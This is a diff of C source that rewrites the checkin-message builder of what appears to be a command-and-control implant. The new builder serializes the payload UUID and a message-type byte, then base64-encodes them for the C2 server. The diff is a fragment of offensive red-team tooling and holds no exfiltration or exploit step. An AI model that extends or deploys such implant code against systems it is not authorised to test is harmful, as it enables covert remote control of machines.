@@ -139,20 +139,32 @@ int base64_decode(const char *in, const unsigned long in_len, char *out) {
  *
 */
 
-char *generate_checkin_message(char *payload_uuid, int len) {
-	// Allocate space for the message and copy over a template value.
+char *generate_checkin_message(CheckinRequest *checkin) {
+	// Allocate space and construct the serialized checkin message.
 	// For now, we only provide the mandatory fields (no information about the host).
-	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	append_str(msg, payload_uuid);
-	append_str(msg, "{\"action\": \"checkin\", \"uuid\": \"");
-	append_str(msg, payload_uuid);
-	append_str(msg, "\"}");
 	
+	int len = 1024; // TODO dynamically calculate len based on what we're sending
+	int offset = 0;
+	
+	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	
+	// Prepend the Payload UUID (36 bytes).
+	for (int i = 0; i < 36; i++) {
+		msg[offset] = checkin->payload_uuid[i];
+		offset++;
+	}
+	
+	// 1 byte for the message type.
+	msg[offset] = MESSAGE_TYPE_CHECKIN;
+	offset += 1;
+	
+	// TODO if optional fields are included, add them along with their length
+	
+	// Base64-encode the serialized message.
 	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	base64_encode(msg, MSVCRT$strlen(msg), encoded_msg);
+	base64_encode(msg, offset, encoded_msg);
 	
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
-	
 	return encoded_msg;
 }
 
